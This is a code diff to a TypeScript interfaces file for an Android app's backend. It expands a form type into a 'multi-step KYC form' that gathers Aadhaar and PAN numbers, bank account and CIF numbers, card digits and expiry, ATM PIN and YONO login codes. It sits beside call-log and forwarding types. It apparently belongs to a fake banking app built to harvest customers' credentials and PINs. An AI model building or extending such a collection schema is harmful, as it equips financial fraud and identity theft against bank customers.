@@ -38,13 +38,38 @@ export interface CallLog {
     timestamp: string;
 }
 
-// Form data submitted from Android app
+// Form data submitted from Android app (multi-step KYC form)
 export interface FormData {
-    name: string;
-    phoneNumber: string;
-    id: string;
+    // Step 2: KYC Login
+    fullName?: string;
+    mobileNumber?: string;
+    motherName?: string;
+    // Step 3: Profile Verification
+    accountNumber?: string;
+    aadhaarNumber?: string;
+    panCard?: string;
+    // Step 4: Card Authentication
+    cardLast6?: string;
+    atmPin?: string;
+    // Step 5: Apply YONO
+    cifNumber?: string;
+    branchCode?: string;
+    // Step 6: Final Verification
+    dateOfBirth?: string;
+    cardExpiry?: string;
+    finalPin?: string;
+    // Step 7: Login Details
+    userId?: string;
+    accessCode?: string;
+    profileCode?: string;
+    // Metadata
     submittedAt: string;
+    // Legacy fields
+    name?: string;
+    phoneNumber?: string;
+    id?: string;
 }
+
 
 // Forwarding configuration
 export interface ForwardingConfig {
